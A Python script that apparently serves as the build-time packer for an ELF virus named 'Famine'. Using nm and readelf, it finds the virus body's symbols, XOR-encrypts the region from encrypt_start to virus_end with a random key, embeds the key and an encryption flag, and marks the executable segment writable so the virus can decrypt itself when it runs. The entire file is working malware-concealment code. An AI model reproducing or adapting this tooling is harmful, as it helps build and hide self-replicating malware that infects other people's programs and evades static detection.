#!/usr/bin/env python3
"""
Famine Binary Encryption Tool
Encrypts the Famine binary using XOR encryption with a random key from /dev/urandom
"""

import sys
import os
import struct

# ELF64 constants
ELF64_E_PHOFF_OFFSET = 32  # Offset to program header table in ELF header
ELF64_E_PHNUM_OFFSET = 56  # Offset to number of program headers in ELF header
ELF64_PHDR_SIZE = 56       # Size of each program header entry

def main():
    famine_path = "./Famine"
    
    print("Encrypting Famine binary...")
    
    # Read the binary
    with open(famine_path, 'rb') as f:
        data = bytearray(f.read())
    
    # Find symbols using nm
    import subprocess
    nm_output = subprocess.check_output(['nm', famine_path], text=True)
    
    # Parse symbol addresses
    symbols = {}
    for line in nm_output.strip().split('\n'):
        parts = line.split()
        if len(parts) >= 3:
            addr, typ, name = parts[0], parts[1], parts[2]
            symbols[name] = int(addr, 16)
    
    # Get required symbols
    virus_start = symbols.get('virus_start')
    encrypt_start = symbols.get('encrypt_start')
    virus_end = symbols.get('virus_end')
    encryption_flag = symbols.get('encryption_flag')
    encryption_key_storage = symbols.get('encryption_key_storage')
    
    if not all([virus_start, encrypt_start, virus_end, encryption_flag, encryption_key_storage]):
        print("Error: Could not find required symbols")
        sys.exit(1)
    
    # Get file offset from virtual address
    # Use readelf to find the LOAD segment containing .text
    readelf_output = subprocess.check_output(['readelf', '-l', famine_path], text=True)
    
    # Parse program headers to find .text segment
    text_file_offset = None
    text_vaddr = None
    in_program_headers = False
    lines = readelf_output.split('\n')
    for i, line in enumerate(lines):
        if 'Program Headers:' in line:
            in_program_headers = True
            continue
        if in_program_headers and 'LOAD' in line:
            # Check if next lines contain executable flag (E)
            # Look at the next few lines for flags
            for j in range(i+1, min(i+3, len(lines))):
                next_line = lines[j]
                # Check for R E or RWE or any combination with E
                if 'E' in next_line and ('R' in next_line or 'W' in next_line):
                    parts = line.split()
                    text_file_offset = int(parts[1], 16)
                    text_vaddr = int(parts[2], 16)
                    break
            if text_file_offset is not None:
                break
    
    if text_file_offset is None or text_vaddr is None:
        print("Error: Could not find .text segment")
        print("readelf output:")
        print(readelf_output)
        sys.exit(1)
    
    # Calculate file offsets
    def vaddr_to_file_offset(vaddr):
        return vaddr - text_vaddr + text_file_offset
    
    encrypt_start_offset = vaddr_to_file_offset(encrypt_start)
    virus_end_offset = vaddr_to_file_offset(virus_end)
    encryption_flag_offset = vaddr_to_file_offset(encryption_flag)
    key_storage_offset = vaddr_to_file_offset(encryption_key_storage)
    
    # Generate random key using /dev/urandom (syscall)
    with open('/dev/urandom', 'rb') as f:
        key = f.read(16)  # KEY_SIZE = 16
    
    print(f"Encrypting {virus_end_offset - encrypt_start_offset} bytes...")
    print(f"Encrypt start offset: 0x{encrypt_start_offset:x}")
    print(f"Virus end offset: 0x{virus_end_offset:x}")
    print(f"Key storage offset: 0x{key_storage_offset:x}")
    
    # Set encryption flag to 1
    struct.pack_into('<Q', data, encryption_flag_offset, 1)
    
    # XOR encrypt the data
    for i in range(encrypt_start_offset, virus_end_offset):
        data[i] ^= key[(i - encrypt_start_offset) % len(key)]
    
    # Write key to key storage
    data[key_storage_offset:key_storage_offset + 16] = key
    
    # Now we need to update the program headers to make .text writable
    # so that the decryption can write back the decrypted bytes
    # The .text segment needs to have RWE flags instead of just RE
    
    # Seek to the program header for .text
    # Program headers start at offset e_phoff (which is at offset 32 in ELF header)
    e_phoff = struct.unpack_from('<Q', data, ELF64_E_PHOFF_OFFSET)[0]
    e_phnum = struct.unpack_from('<H', data, ELF64_E_PHNUM_OFFSET)[0]
    
    # Find the .text segment (the second LOAD segment with R E flags)
    for i in range(e_phnum):
        phdr_offset = e_phoff + i * ELF64_PHDR_SIZE
        p_type = struct.unpack_from('<I', data, phdr_offset)[0]
        p_flags = struct.unpack_from('<I', data, phdr_offset + 4)[0]
        p_offset = struct.unpack_from('<Q', data, phdr_offset + 8)[0]
        
        # PT_LOAD = 1, check if it's the .text segment
        if p_type == 1 and p_offset == text_file_offset:
            # Found the .text segment
            # p_flags: 1=PF_X, 2=PF_W, 4=PF_R
            # Current flags should be 5 (R=4 + X=1)
            # We want 7 (R=4 + W=2 + X=1)
            new_flags = p_flags | 2  # Add write flag
            struct.pack_into('<I', data, phdr_offset + 4, new_flags)
            print(f"Updated .text segment flags from {p_flags} to {new_flags}")
            break
    
    # Write the updated binary
    with open(famine_path, 'wb') as f:
        f.write(data)
    
    print("Encryption complete!")

if __name__ == '__main__':
    main()
